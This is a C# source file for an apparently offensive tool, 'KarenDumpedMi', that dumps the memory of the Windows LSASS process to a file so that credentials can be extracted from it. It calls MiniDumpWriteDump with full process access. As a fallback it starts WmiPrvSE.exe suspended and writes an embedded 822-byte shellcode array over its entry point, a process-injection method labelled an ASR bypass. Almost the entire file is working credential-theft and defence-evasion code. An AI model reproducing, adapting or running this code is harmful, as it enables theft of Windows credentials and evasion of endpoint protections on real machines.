using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using static KarenDumpedMi.Win32;

namespace KarenDumpedMi
{
    internal class Program
    {
        public class Options
        {
            [OptionParameter(ShortName = 'h', DefaultValue = false)]
            public bool Help { get; set; }
        }

        public static void banner()
        {
            Console.WriteLine(@"
     _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (  \  )| )   ( || () () || (    )|| (    \/| (  \  )| () () |   ) (   
    |  (_/ / | (___) || (____)|| (__    |   \ | || |   ) || |   | || || || || (____)|| (__    | |   ) || || || |   | |   
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |   | || |   | || |(_)| ||  _____)|  __)   | |   | || |(_)| |   | |   
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |   ) || |   | || |   | || (      | (      | |   ) || |   | |   | |   
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (__/  )| (___) || )   ( || )      | (____/\| (__/  )| )   ( |___) (___
    |_/    \/|/     \||/   \__/(_______/|/    )_)(______/ (_______)|/     \||/       (_______/(______/ |/     \|\_______/
            ");
        }

        public static void help()
        {
            Console.WriteLine(" KarenDumpedMi: MiniDumpWriteDump With ASR Bypass");
            Console.WriteLine("");
            Console.WriteLine("  -h, --help     Display help screen manual.");
        }

        public static void ASRBypassDump()
        {
            /* ASR Bypass LSASS Dumping */

            Console.WriteLine("");
            Console.WriteLine("[>] Method 1 Failed! Trying Method 2");
            Console.WriteLine("    |-> Dumping LSASS With ASR Bypass!");

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            Console.WriteLine("");
            Console.WriteLine("[>] Spawning WmiPrvSE.exe");

            Win32.CreateProcess(
                null,
                "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            var target = Process.GetProcessById(pi.dwProcessId);
            Console.WriteLine("    |-> PID: {0}", target.Id);

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            Win32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            Win32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr WmiPrvSEBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            Win32.ReadProcessMemory(hProcess, WmiPrvSEBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)WmiPrvSEBase);

            byte[] buf = new byte[822] {
            0xE9, 0x1B, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,
            0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
            0x8B, 0xF1, 0x48, 0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x4A, 0x10, 0x4D, 0x8B, 0x41, 0x30, 0x4D, 0x85,
            0xC0, 0x0F, 0x84, 0xB8, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3C,
            0x4D, 0x8B, 0x09, 0x42, 0x8B, 0x9C, 0x00, 0x88, 0x00, 0x00, 0x00, 0x33, 0xD2, 0xF3, 0x0F, 0x7F,
            0x04, 0x24, 0x85, 0xDB, 0x74, 0xD4, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x44, 0x0F,
            0xB7, 0xD0, 0x45, 0x85, 0xD2, 0x74, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x45, 0x8B, 0xDA, 0xC1,
            0xCA, 0x0D, 0x80, 0x39, 0x61, 0x0F, 0xBE, 0x01, 0x7C, 0x03, 0x83, 0xC2, 0xE0, 0x03, 0xD0, 0x48,
            0xFF, 0xC1, 0x49, 0xFF, 0xCB, 0x75, 0xE8, 0x4D, 0x8D, 0x14, 0x18, 0x33, 0xC9, 0x41, 0x8B, 0x7A,
            0x20, 0x49, 0x03, 0xF8, 0x41, 0x39, 0x4A, 0x18, 0x76, 0x90, 0x8B, 0x1F, 0x45, 0x33, 0xDB, 0x48,
            0x8D, 0x7F, 0x04, 0x49, 0x03, 0xD8, 0x41, 0xC1, 0xCB, 0x0D, 0x0F, 0xBE, 0x03, 0x48, 0xFF, 0xC3,
            0x44, 0x03, 0xD8, 0x80, 0x7B, 0xFF, 0x00, 0x75, 0xED, 0x41, 0x8D, 0x04, 0x13, 0x3B, 0xC6, 0x74,
            0x0D, 0xFF, 0xC1, 0x41, 0x3B, 0x4A, 0x18, 0x72, 0xD1, 0xE9, 0x5C, 0xFF, 0xFF, 0xFF, 0x41, 0x8B,
            0x42, 0x24, 0x03, 0xC9, 0x49, 0x03, 0xC0, 0x0F, 0xB7, 0x04, 0x01, 0x41, 0x8B, 0x4A, 0x1C, 0xC1,
            0xE0, 0x02, 0x48, 0x98, 0x49, 0x03, 0xC0, 0x8B, 0x04, 0x01, 0x49, 0x03, 0xC0, 0xEB, 0x02, 0x33,
            0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x10, 0x5F,
            0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41,
            0x57, 0x48, 0x8D, 0xAC, 0x24, 0x28, 0xFF, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xD8, 0x01, 0x00, 0x00,
            0x33, 0xC0, 0x48, 0x8D, 0x7D, 0xA0, 0xB9, 0x30, 0x01, 0x00, 0x00, 0xF3, 0xAA, 0x45, 0x33, 0xF6,
            0xB9, 0x4C, 0x77, 0x26, 0x07, 0xC7, 0x45, 0x80, 0x6B, 0x65, 0x72, 0x6E, 0xC7, 0x45, 0x84, 0x65,
            0x6C, 0x33, 0x32, 0xC7, 0x45, 0x88, 0x2E, 0x64, 0x6C, 0x6C, 0x44, 0x88, 0x75, 0x8C, 0xC7, 0x44,
            0x24, 0x70, 0x64, 0x62, 0x67, 0x63, 0xC7, 0x44, 0x24, 0x74, 0x6F, 0x72, 0x65, 0x2E, 0xC7, 0x44,
            0x24, 0x78, 0x64, 0x6C, 0x6C, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x6E, 0x74, 0x64, 0x6C, 0xC7, 0x44,
            0x24, 0x64, 0x6C, 0x2E, 0x64, 0x6C, 0x66, 0xC7, 0x44, 0x24, 0x68, 0x6C, 0x00, 0xC7, 0x44, 0x24,
            0x50, 0x6C, 0x73, 0x61, 0x73, 0xC7, 0x44, 0x24, 0x54, 0x73, 0x2E, 0x64, 0x6D, 0x66, 0xC7, 0x44,
            0x24, 0x58, 0x70, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x6C, 0x73, 0x61, 0x73, 0xC7, 0x44, 0x24, 0x44,
            0x73, 0x2E, 0x65, 0x78, 0x66, 0xC7, 0x44, 0x24, 0x48, 0x65, 0x00, 0xC6, 0x85, 0x20, 0x01, 0x00,
            0x00, 0x61, 0xE8, 0x51, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0x80, 0x48, 0x8B, 0xF8, 0xFF, 0xD7,
            0x48, 0x8D, 0x4C, 0x24, 0x70, 0xFF, 0xD7, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xFF, 0xD7, 0xB9, 0x80,
            0x39, 0x1E, 0x92, 0xE8, 0x30, 0xFE, 0xFF, 0xFF, 0xB9, 0xDA, 0xF6, 0xDA, 0x4F, 0x48, 0x8B, 0xF0,
            0xE8, 0x23, 0xFE, 0xFF, 0xFF, 0xB9, 0x27, 0xA9, 0xE8, 0x67, 0x48, 0x8B, 0xF8, 0xE8, 0x16, 0xFE,
            0xFF, 0xFF, 0xB9, 0x8D, 0x52, 0x01, 0xBD, 0x48, 0x8B, 0xD8, 0xE8, 0x09, 0xFE, 0xFF, 0xFF, 0xB9,
            0x74, 0x71, 0x8D, 0xDC, 0x4C, 0x8B, 0xE0, 0xE8, 0xFC, 0xFD, 0xFF, 0xFF, 0xB9, 0xB4, 0x73, 0x8D,
            0xE2, 0x4C, 0x8B, 0xF8, 0xE8, 0xEF, 0xFD, 0xFF, 0xFF, 0xB9, 0xEE, 0x95, 0xB6, 0x50, 0x4C, 0x8B,
            0xE8, 0xE8, 0xE2, 0xFD, 0xFF, 0xFF, 0xB9, 0x3D, 0xD7, 0xC8, 0x6E, 0x48, 0x89, 0x85, 0x30, 0x01,
            0x00, 0x00, 0xE8, 0xD1, 0xFD, 0xFF, 0xFF, 0xB9, 0x7A, 0x19, 0x77, 0x6A, 0x48, 0x89, 0x45, 0x90,
            0xE8, 0xC3, 0xFD, 0xFF, 0xFF, 0x4C, 0x8D, 0x8D, 0x28, 0x01, 0x00, 0x00, 0x41, 0x8D, 0x4E, 0x14,
            0x45, 0x33, 0xC0, 0xB2, 0x01, 0xFF, 0xD0, 0x4C, 0x21, 0x74, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24,
            0x50, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0x00, 0x00, 0x00, 0x10, 0xC7, 0x44, 0x24, 0x28,
            0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x33, 0xD2,
            0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x8D, 0x4A, 0x02, 0xFF, 0xD6, 0x48, 0x8D, 0x55, 0xA0,
            0xC7, 0x45, 0xA0, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0x8B, 0xF8, 0xFF, 0xD3, 0x33,
            0xDB, 0x85, 0xC0, 0x74, 0x31, 0xEB, 0x1C, 0x48, 0x8D, 0x55, 0xA0, 0x48, 0x8B, 0xCF, 0x41, 0xFF,
            0xD4, 0x48, 0x8D, 0x55, 0xCC, 0x48, 0x8D, 0x8D, 0x20, 0x01, 0x00, 0x00, 0x41, 0xFF, 0xD5, 0x44,
            0x8B, 0x75, 0xA8, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x8D, 0x20, 0x01, 0x00, 0x00, 0x41,
            0xFF, 0xD7, 0x85, 0xC0, 0x75, 0xD1, 0x45, 0x8B, 0xC6, 0x33, 0xD2, 0xB9, 0xFF, 0xFF, 0x1F, 0x00,
            0xFF, 0x95, 0x30, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5C,
            0x24, 0x30, 0x48, 0x8B, 0xC8, 0x41, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xD6, 0x48, 0x89,
            0x5C, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xFF, 0x55, 0x90, 0x48, 0x81, 0xC4, 0xD8, 0x01,
            0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC,
            0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0xD3, 0xFD, 0xFF,
            0xFF, 0x48, 0x8B, 0xE6, 0x5E, 0xC3
            };

            Win32.WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            Win32.ResumeThread(pi.hThread);

            Console.WriteLine("");
            Console.WriteLine("[>] COMPLETED! You can now parse lsass.dmp!");

            Process.GetCurrentProcess().Kill();
        }

        static void Main(string[] args)
        {
            /* Command Line Arguments Parsing */

            var options = CommandLineArgumentParser.Parse<Options>(args).ParsedOptions;

            /* Entry Point */

            banner();

            if (options.Help)
            {
                help();
                Process.GetCurrentProcess().Kill();
            }

            /* Basic LSASS Dumping */

            Console.WriteLine("[>] Finding Alive Process");
            Process lsassProc = Process.GetProcessesByName("lsass").FirstOrDefault();
            Int32 PID = 0;
            if (lsassProc is not null)
            {
                PID = lsassProc.Id;
                Console.WriteLine("    |-> Found lsass.exe");
                Console.WriteLine("    |-> PID: " + lsassProc.Id);
            }
            else
            {
                Console.WriteLine("    |-> Unable to find lsass.exe");
                Process.GetCurrentProcess().Kill();
            }

            Console.WriteLine("");
            Console.WriteLine("[>] Finding MiniDumpWriteDump");

            IntPtr hFunction = Win32.GetProcAddress(Win32.LoadLibrary("Dbghelp.dll"), "MiniDumpWriteDump");
            Console.WriteLine("    |-> Location of MiniDumpWriteDump(): 0x{0}", hFunction.ToString("X"));

            Console.WriteLine("");
            Console.WriteLine("[>] Getting Handles");

            var hProc = Win32.OpenProcess(
                0x001F0FFF,     // PROCESS_ALL_ACCESS
                false, 
                PID);  

            if (hProc != IntPtr.Zero)
            {
                Console.WriteLine("    |-> Process Handle: 0x{0}", hProc.ToString("X"));
            }
            else
            {
                Console.WriteLine("    |-> Unable to Open Process Handle!");
                ASRBypassDump();
            }

            var hFile = Win32.CreateFile(
                "karen.dmp", 
                1073741824,         // GENERIC_WRITE
                2,                  // FILE_SHARE_WRITE
                IntPtr.Zero, 
                2,                  // CREATE_ALWAYS
                128,                // FILE_ATTRIBUTE_NORMAL
                IntPtr.Zero);
            
            if (hFile != IntPtr.Zero)
            {
                Console.WriteLine("    |-> File Handle (karen.dmp): 0x{0}", hFile.ToString("X"));
            }
            else 
            {
                Console.WriteLine("    |-> Unable to Open File Handle!");
                ASRBypassDump();
            }

            Console.WriteLine("");
            Console.WriteLine("[>] Invoking MiniDumpWriteDump");

            bool bSuccess = false;
            Win32.MiniDumpWriteDump miniDumpWriteDump = (Win32.MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(hFunction, typeof(Win32.MiniDumpWriteDump));
            bSuccess = miniDumpWriteDump(
                hProc, 
                PID, 
                hFile, 
                2, 
                IntPtr.Zero, 
                IntPtr.Zero, 
                IntPtr.Zero);

            if (bSuccess)
            { 
                Console.WriteLine("    |-> Successfully Called MiniDumpWriteDump()");
                Console.WriteLine("    |-> COMPLETED! You can now parse karen.dmp!");
            }
            else
            {
                Console.WriteLine("    |-> Failed to Call MiniDumpWriteDump()");
                ASRBypassDump();
            }
        }
    }
}